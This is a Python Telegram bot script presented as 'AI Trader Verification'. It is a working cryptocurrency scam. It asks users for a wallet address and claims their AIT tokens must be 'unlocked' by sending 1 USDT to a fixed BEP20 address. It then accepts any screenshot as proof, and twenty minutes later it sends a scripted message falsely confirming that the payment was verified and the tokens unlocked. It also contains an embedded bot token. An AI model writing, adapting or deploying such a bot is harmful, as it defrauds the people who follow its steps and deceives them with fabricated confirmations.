import telebot
from telebot import types
import threading
import time
# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot = telebot.TeleBot('6475877842:AAG4hhLAI1AzN-wkSIC1lrrRQyEiiOPf8ok')
next_pressed = False 
waiting_for_screenshot = False
def send_delayed_message(chat_id, message_text, delay):
    time.sleep(delay)
    bot.send_message(chat_id, message_text)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    verify_button = telebot.types.KeyboardButton("✅VERIFY ADDRESS")
    markup.add(verify_button)

    bot.send_message(message.chat.id, "🛍 Welcome to AI Trader Verification!\n\nPress the ✅VERIFY ADDRESS button to proceed:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "✅VERIFY ADDRESS")
def verify_address(message):
    markup = telebot.types.ReplyKeyboardRemove()  # Remove the custom keyboard

    bot.send_message(message.chat.id, "🧰 Please enter your AIT deposit address:", reply_markup=markup)
    bot.register_next_step_handler(message, process_verification)


    
def process_verification(message):
    entered_address = message.text.strip()

    if len(entered_address) != 42:
        bot.send_message(message.chat.id, "Invalid address. Please enter a valid address.")
    else:
        verification_message1 = f"🛍Hello, {message.from_user.username}! 👋\nVerification is needed to UNLOCK your AIT.\n\n"\
                               "🛍AI Trader will launch the mainnet before August 15.\n"\
                               "🪅The mainnet will be launched\n🪅IDO will be closed\n🪅AIT will be listed\n"\
                               "📈$AIT launch price≈ $0.02\n📈$AIT IDO price≈ $0.0004 (0.00000156BNB)\n"\
                               "🔰AIT Contract: \n0x4238E5Ccc619dCC8c00ADE4cfc5d3D9020b24898\n\n"\
                               "✅UNLOCK your AIT so you can sell it on Binance or Pancakeswap now\n"\
                               f"🔰Your address:\n{entered_address}"

        bot.send_message(message.chat.id, verification_message1)
        next_pressed = False  # Reset next_pressed flag
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        next_button = telebot.types.KeyboardButton("NEXT➡️")
        markup.add(next_button)

        bot.send_message(message.chat.id, "➡️Press NEXT to proceed:", reply_markup=markup)
        bot.register_next_step_handler(message, process_next)
def process_next(message):
    global next_pressed

    if message.text == "NEXT➡️" and not next_pressed:
        next_pressed = True
        verification_message = "📝 For verification...\n\n"\
                               "✅1. Send 1 USDT to this BEP20 Address:\n"\
                               "0x1ba2d831c0a0b6c86b46e8276953d8076c7b4400\n\n"\
                               "💯 Refundable in AIT tokens after launch to your AIT address\n"\
                               "✅2. Screenshot the transaction and attach proof in next step\n"\
                               "✅3. Await verification and an AIT assistant will be in touch to confirm your verification\n\n"\
                               "📝 You will also get verification status from this bot in 20 mins\n\n"\
                               "📝 Incase of anything: Talk to our verification assistant:\n\n"\
                               '✅ @AshleyFoxy'\
                               
        already_paid_verify_pressed = False  # Reset next_pressed flag
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        next_button = telebot.types.KeyboardButton("ALREADY SENT,VERIFY ADDRESS")
        markup.add(next_button)                        
        bot.send_message(message.chat.id, verification_message)
        bot.send_message(message.chat.id, "if Paid Press Already paid verify to proceed:", reply_markup=markup)
        bot.register_next_step_handler(message, process_already_paid_verification)
def process_already_paid_verification(message):
    if message.text == "ALREADY SENT,VERIFY ADDRESS":
        bot.send_message(message.chat.id, "Click ALREADY SENT,VERIFY ADDRESS if payment is done.\n\n"\
                                       "📎Please upload an image as proof of payment.")
    else:
        bot.send_message(message.chat.id, "Press 'ALREADY SENT,VERIFY ADDRESS' to proceed.")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
        bot.send_message(message.chat.id, "♻️ Image received and under processing.\n\n"\
                                  "✅ Verification process complete!\n\n"\
                                  "You will get the status of your verification within 20 minutes.\n\n"\
                                  "In case of delays, talk to our Verification Assistant: ✅ @AshleyFoxy")
        bot.send_message(message.chat.id, "Your default keyboard has been restored.")

# Send a follow-up message after 10 minutes
        follow_up_message = "🎉 Congratulations! 🎉\n\n"\
                     "It's been 20 minutes since your payment. Your payment has been verified and your AI tokens are now unlocked! 🚀💰\n"\
                     "Feel free to start trading and enjoy the benefits of AI Trader.\n"\
                     "If you have any questions or need assistance, don't hesitate to reach out to us. Happy trading! 🤖💹"
        threading.Thread(target=send_delayed_message, args=(message.chat.id, follow_up_message, 1200)).start()

if __name__ == '__main__':
    bot.polling()